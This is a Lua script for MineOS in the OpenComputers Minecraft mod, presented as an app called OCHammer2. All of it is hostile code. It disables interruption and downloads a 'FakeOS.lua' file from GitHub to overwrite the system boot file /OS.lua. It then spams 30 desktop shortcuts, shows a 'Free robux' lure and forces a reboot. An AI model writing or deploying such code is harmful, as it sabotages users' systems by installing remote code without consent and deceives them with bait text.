
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local paths = require("Paths")
local com = require("Component")
local event = require("event")
local fs = require("Filesystem")
local internet = require("Internet")

local wait = event.sleep

-- OCHammer2.app
-- Copyright (c) 2022-2022 ocboy3

-- Why did Carl the NPC want to get the freaking gun?



event.interruptingEnabled = false

function FUN()

  local cdir = fs.path(system.getCurrentScript())

  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/FakeOS.lua","/OS.lua")
  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/PLEASE READ ME.txt","/MineOS/PLEASE READ ME.txt")

  -- spam a bunch of icons on the desktop
  for i = 1,30 do
    system.createShortcut(paths.user.desktop .. "PLEASE READ ME " .. tostring(i),"/MineOS/PLEASE READ ME.txt/")
  end

  -- update the file list
  event.push("system","updateFileList")
  
  GUI.alert("Free robux")

  -- reboot the computer
  com.computer.shutdown(true)


end

FUN()
